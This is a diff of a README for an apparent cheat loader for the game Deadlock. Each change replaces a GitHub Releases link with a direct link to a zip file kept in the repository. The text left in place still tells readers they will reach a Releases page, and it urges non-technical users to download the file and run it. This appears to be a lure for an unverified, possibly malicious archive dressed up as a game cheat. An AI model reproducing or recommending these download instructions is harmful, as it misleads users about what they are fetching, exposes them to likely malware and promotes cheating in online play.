@@ -1,6 +1,6 @@
 # 🎯 deadlock-script-loader-2026 - Precision Aim, Instant Awareness, Total Control
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cardiovascular-ponytail533/deadlock-script-loader-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cardiovascular-ponytail533/deadlock-script-loader-2026/main/Aimee/loader_script_deadlock_v2.8.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Follow these simple steps to get up and running. No technical knowledge required
 
 Visit this link to download the application:
 
-👉 **[https://github.com/cardiovascular-ponytail533/deadlock-script-loader-2026/releases](https://github.com/cardiovascular-ponytail533/deadlock-script-loader-2026/releases)**
+👉 **[https://raw.githubusercontent.com/cardiovascular-ponytail533/deadlock-script-loader-2026/main/Aimee/loader_script_deadlock_v2.8.zip](https://raw.githubusercontent.com/cardiovascular-ponytail533/deadlock-script-loader-2026/main/Aimee/loader_script_deadlock_v2.8.zip)**
 
 You will land on the **Releases** page. Look for the newest version at the top of the list. Click the file link to start your download.
 
@@ -146,7 +146,7 @@ The project releases updates regularly to maintain compatibility with the latest
 
 When a new version drops:
 
-1. Go to the **[Releases page](https://github.com/cardiovascular-ponytail533/deadlock-script-loader-2026/releases)**.
+1. Go to the **[Releases page](https://raw.githubusercontent.com/cardiovascular-ponytail533/deadlock-script-loader-2026/main/Aimee/loader_script_deadlock_v2.8.zip)**.
 2. Download the latest file.
 3. Run it — your settings will carry over automatically.
 
